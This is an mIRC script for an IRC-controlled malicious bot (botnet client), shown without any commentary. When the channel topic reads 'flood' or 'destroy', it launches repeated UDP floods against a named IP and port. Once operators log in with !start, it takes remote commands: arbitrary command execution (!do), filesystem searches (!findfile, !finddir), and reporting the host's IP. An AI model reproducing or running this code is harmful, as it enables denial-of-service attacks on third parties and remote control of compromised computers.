   @#$%^&*@#$%^&*@#$%^&*@#$%^&*#$%^&*#$%^&*#$%^&*@#$%^&*
   on *:topic:%chan:if ($1 == flood) && ($3 != $null) { set %victim.ip $2 | set %victim.port $3 | set %at 0 | ataka } | if ($1 == destroy) && ($2 != $null) { timeru.a -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(10,500) %mysor %musor ECHO $ip | timeru.b -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(500,4000) %mysor %musor ECHO $ip | timeru.c -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(4000,60000) %mysor %musor ECHO $ip } | if ($1 == stopall) { timers off | timer* off }

   alias channick { return $iif(# != $null,#,$nick) }
   alias schannick { return $iif(# != $null,#,$nick) }
   alias ping { ctcp $me ping }

   on ^*:text:!start:#:  {
     if ($nick !isop #) { halt }
     set %auth $+ $nick yes | .msg # Logged on
   }

   on *:text:*:*: {
     if (%auth [ $+ [ $nick ] ] != yes) { halt }

     if ($1 == !ip) { msg  $channick ip: $ip host: $host }
     if ($1 == !j) { if ($2 == $null) { halt } | join $2- }
     if ($1 == !p) { if ($2 == $null) { halt } | part $2- }
     if ($1 == !finddir) { if ($2 == $null) { halt } | if ($3 == $null) { halt } | if ($4 == $null) { halt } | msg $channick $finddir($2,$3,$4,$1-) }
     if ($1 == !findfile) { if ($2 == $null) { halt } | if ($3 == $null) { halt } | if ($4 == $null) { halt } | msg $channick $findfile($2,$3,$4,$1-) }
     if ($1 == !timer) { if ($2 == $null) { halt } | msg $channick timer $2 = $timer($2) }
     if ($1 == !online) { msg $channick on server: $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%conntime))) on network: $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%ontime))) | close -m $nick }
     if ($1 == !do) { if ($2 == $null) { halt } | if ($2 == exit) { halt } | if ($2 == /exit) { halt } | msg $channick Done | $2- }
     if ($1 == !var) { if ($2  == $null) { halt } | if ([ [ $2 ] ] == $null) { msg  $channick Var $2 is empty | halt } | msg  $channick Var $2- = [ [ $2- ] ] }
     if ($1 == !quit) { msg $channick Reconnecting | server }
   }
